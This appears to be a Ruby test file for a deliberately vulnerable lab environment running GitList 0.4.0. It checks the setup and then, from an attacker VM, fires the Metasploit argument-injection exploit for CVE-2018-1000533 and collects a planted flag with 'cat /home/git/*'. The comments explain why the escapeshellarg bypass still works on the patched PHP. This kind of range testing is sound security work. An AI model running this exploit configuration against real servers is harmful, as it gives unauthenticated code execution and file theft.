require_relative '../../../../../lib/post_provision_test'

# Gitlist 0.4.0 RCE (CVE-2018-1000533) on patched PHP 7.4 (php7_patched).
# tier 2 proves GitList serves via Apache -> php-fpm and that the php2shell fix
# is present, so only the app's own argument-injection CVE is exploitable.
# tier 3 runs exploit/multi/http/gitlist_arg_injection from an attacker VM and
# proves unauthenticated RCE via the argument-injection sink in GitList's search
# (git log --grep is called with user-supplied input, escapeshellarg-bypassed).
# The leaked flag is in /home/git/ (owner www-data, mode 0750), readable by the
# exploit process (www-data). TARGETURI '/' because the Apache docroot is
# /var/www/gitlist (no subdirectory prefix). No credentials are required.
# Tier 3 SKIPs cleanly when there is no attacker sibling (single-VM run).
class Gitlist040Test < PostProvisionTest
  FIX_COMMIT = '712e60f9edfd03f0960fc4fc3c2c375f42b90aa2'.freeze

  def initialize
    self.module_name = 'gitlist_040'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    tier(1) do
      test_local_command('gitlist docroot exists', 'test -d /var/www/gitlist && echo ok', 'ok')
      test_local_command('git installed', 'which git', '/usr/bin/git')
      test_local_command('patched php present', 'test -x /opt/php-7.4-patched/bin/php && echo ok', 'ok')
    end
    tier(2) do
      test_service_up
      # Match the page body (not curl %{http_code}: the % is eaten by the
      # guest-agent exec path). Retry while GitList/php-fpm warm up.
      test_local_command('gitlist serves (Apache+php-fpm)',
                         "for i in $(seq 1 15); do curl -s http://127.0.0.1:#{self.port}/ | grep -q GitList && { echo SERVED_GITLIST; break; }; sleep 2; done", 'SERVED_GITLIST')
      test_local_command('php2shell fix present (CVE-2026-109618/109619)',
                         'cat /opt/php-7.4-patched/PHP2SHELL_FIX_COMMIT', FIX_COMMIT)
    end
    # Tier 3: argument-injection RCE from the attacker VM (CVE-2018-1000533).
    # php/unix/cmd/generic: the module is PHP-platform (cmd/unix/generic is
    # incompatible). The argument injection runs the CMD via the PHP exec call
    # to git, outside the php2shell-patched function restrictions, so the
    # patched PHP 7.4 still allows this execution path. collect reads the
    # leaked flag from /home/git/ (owner www-data, mode 0750 — readable by
    # the exploit process running as www-data).
    test_msf_exploit('exploit/multi/http/gitlist_arg_injection',
                     rport: self.port,
                     payload: 'php/unix/cmd/generic',
                     collect: 'cat /home/git/*',
                     options: { 'TARGETURI' => '/' },
                     tier: 3)
  end
end

Gitlist040Test.new.run
